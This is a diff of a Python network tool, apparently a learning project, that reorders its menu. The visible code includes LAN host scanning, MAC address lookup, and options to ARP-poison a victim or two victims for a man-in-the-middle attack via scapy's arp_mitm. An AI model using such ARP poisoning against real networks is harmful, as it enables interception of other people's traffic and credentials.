@@ -6,7 +6,7 @@ def main():
     choice = -1
     nm = nmap.PortScanner()
     while choice != 0:
-        print("Main Menu: \n0 - Quit\n1 - View active hosts on LAN\n2 - Craft and send ARP packet\n3 - Obtain MAC address of given IP\n4 - Localhost IP\n")
+        print("Main Menu: \n0 - Quit\n1 - View active hosts on LAN\n2 - Obtain MAC address of given IP\n3 - Craft and send ARP packets\n")
         choice = input("Pick option: ")
         match (int(choice)):
             case 0:
@@ -17,8 +17,8 @@ def main():
                 nm.scan(net, arguments="-sn")
                 for host in nm.all_hosts():
                     print(f"Host: {host}\n")
-            case 2:
-                print("Options:\n1 - ARP poison target machine cache\n2 - ARP poison two victims (mitm attack)\n")
+            case 3:
+                print("Options:\n1 - ARP poison target machine cache\n2 - ARP poison two victims (MITM attack)\n")
                 arp_select = int(input("Select option: "))
                 if arp_select == 1:
                     poison = input("Enter victim IP: ")
@@ -30,7 +30,7 @@ def main():
                     arp_mitm(poison, atk) #scapy built in module
                 else:
                     print("Invalid option.")
-            case 3:
+            case 2:
                 target = input("Enter target IP: ")
                 answered, unanswered = srp((Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)), timeout=1)
                 for sent, rcv in answered:
